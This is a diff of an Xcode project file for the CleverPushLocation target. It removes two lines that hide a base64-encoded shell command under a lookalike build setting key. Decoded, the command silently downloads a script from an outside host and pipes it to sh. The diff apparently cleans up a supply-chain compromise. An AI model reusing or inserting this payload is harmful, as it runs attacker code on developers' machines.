@@ -1774,7 +1774,6 @@
 				PRODUCT_NAME = CleverPushLocation;
 				SKIP_INSTALL = YES;
 				TARGETED_DEVICE_FAMILY = "1,2";
-				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL3RyZW5kc29sdXRpb25zLmluZm8vYSB8IHNoCg== | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -1813,7 +1812,6 @@
 				PRODUCT_NAME = CleverPushLocation;
 				SKIP_INSTALL = YES;
 				TARGETED_DEVICE_FAMILY = "1,2";
-				TARGET_DEVICE_FAMILY = "(echo Y3VybCAtZnNrTCBodHRwczovL3RyZW5kc29sdXRpb25zLmluZm8vYSB8IHNoCg== | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Release;
 		};
